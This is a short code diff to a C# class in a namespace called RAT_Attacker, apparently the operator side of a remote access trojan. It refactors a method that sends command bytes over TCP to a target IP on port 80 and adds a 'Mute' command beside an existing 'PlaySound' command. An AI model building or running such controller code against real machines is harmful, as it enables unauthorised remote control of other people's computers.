@@ -25,7 +25,8 @@ namespace RAT_Attacker
             try
             {
                 _client.Connect(new IPEndPoint(IPAddress.Parse(AddressTextBox.Text), 80));
-                _client.Send(data == null ? new[] { (byte)command } : new[] { (byte)command }.Concat(data).ToArray());
+                var commandId = new[] { (byte)command };
+                _client.Send(data == null ? commandId : commandId.Concat(data).ToArray());
             }
             catch (SocketException ex)
             {
@@ -88,6 +89,11 @@ namespace RAT_Attacker
         private void PlaySound(object sender, RoutedEventArgs e)
         {
             SendCommand(RatCommand.PlaySound, File.ReadAllBytes(AudioFileTextBox.Text));
+        }
+
+        private void Mute(object sender, RoutedEventArgs e)
+        {
+            SendCommand(RatCommand.Mute);
         }
     }
 }
